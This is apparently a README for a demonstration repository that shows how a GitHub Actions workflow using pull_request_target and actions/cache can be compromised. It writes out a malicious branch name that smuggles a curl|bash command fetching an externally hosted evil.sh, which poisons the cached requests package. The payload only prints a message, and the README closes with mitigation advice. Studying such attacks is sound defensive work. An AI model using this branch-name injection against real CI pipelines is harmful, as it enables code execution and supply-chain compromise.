## README - test

### Overview

This repository demonstrates how a GitHub Actions pipeline can be compromised through a malicious pull request that abuses `pull_request_target` and caching. Specifically, an attacker can run their own code in the CI environment and poison the `.pip-cache`, causing future builds to print "You are hacked!" without any further attacker involvement.

**Key points:**

- The pipeline uses `pull_request_target`.
- The workflow uses `actions/cache` to store Python dependencies in `.pip-cache`.
- The attacker’s malicious code, hosted externally, modifies the cached `requests` dependency to print "You are hacked!" whenever `requests` is imported.
- After poisoning the cache, subsequent main branch builds restore the maliciously altered dependencies and display the hacked message.

### The Attacker’s Payload

The attacker hosts a malicious script (`evil.sh`) externally. The provided script is available at:

```
https://gist.githubusercontent.com/colek42/0a6254d21b98e7a437d568126e1d261c/raw/ec71ca09b8f0bede20547679315f5213c638d444/evil.sh
```

**What `evil.sh` Does:**

1. It locates the `requests` package in `.pip-cache`.
2. It prepends a `print("You are hacked!")` statement to `requests/__init__.py`.
3. This ensures that any future import of `requests` will display the hacked message.

### The Malicious Branch Name

To run `evil.sh`, the attacker crafts a PR from a branch name that executes a `curl|bash` payload. For example:

```
$({curl,-sSfL,https://gist.githubusercontent.com/colek42/0a6254d21b98e7a437d568126e1d261c/raw/ec71ca09b8f0bede20547679315f5213c638d444/evil.sh}|bash)
```

When the CI workflow encounters `git pull origin $branch`, it substitutes this malicious branch name, thus fetching and executing `evil.sh` during the `pull_request_target` event.

### Steps to Reproduce (High-Level)

1. **Initial Setup:**
   - You set up this repository with a simple Python application in `src/`.
   - `requirements.txt` includes `requests`.
   - The `ci.yml` workflow uses `pull_request_target` and `actions/cache`.

2. **Initial Run:**
   - On push to `main`, the workflow runs, installs `requests`, and caches it.  
   - `python src/main.py` prints “Hello, world!” normally.

3. **Attacker’s PR:**
   - The attacker creates a PR from a maliciously named branch as described.
   - The CI runs `pull_request_target`, executes `git pull origin $branch`, and thus runs `evil.sh`.
   - `evil.sh` poisons `.pip-cache` by modifying `requests/__init__.py` to print “You are hacked!”.

4. **After the Attack:**
   - Merging the PR or simply triggering another run on `main` restores the now-poisoned cache.
   - `requests` is imported again, but this time it prints “You are hacked!” before returning.

### Observing the Result

After the cache is poisoned, any new run on `main` that imports `requests` will display:

```
You are hacked!
Hello, world!
```

This shows the persistent compromise carried forward by the cached dependencies.

### Cleanup and Mitigation

- To reset the environment, modify `requirements.txt` (e.g., add a blank line) to change the cache key and force a fresh dependency install.  
- Remove or avoid `pull_request_target` for untrusted code.  
- Validate file integrity or use supply chain security tools (like Witness) to detect unexpected modifications.
